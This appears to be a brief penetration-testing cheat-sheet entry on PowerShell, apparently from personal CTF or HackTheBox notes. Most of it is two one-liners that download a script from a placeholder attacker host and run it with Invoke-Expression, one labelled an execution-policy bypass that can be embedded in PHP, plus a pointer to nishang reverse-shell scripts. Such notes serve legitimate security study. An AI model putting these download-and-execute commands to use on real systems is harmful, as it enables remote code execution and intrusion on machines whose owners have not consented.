# PowerShell

Powershell full path: `C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe`

Powershell "wget" and execute remote code:

```text
powershell "Invoke-Expression(New-Object Net.Webclient).downloadString('http://<ip>:<port>/<filename>')"
```

Powershell Script Execution Bypass: \[can embed in php too! TODO: write script example of this\]:

```text
echo IEX(New-Object Net.WebClient).DownloadString(http://<ip:port/filename.ps1>) | powershell -noprofile -
```

Powershell reverse shell and exploit scripts: nishang [Ippsec:HacktheBox - Optimum](https://www.youtube.com/watch?v=kWTnVBIpNsE)

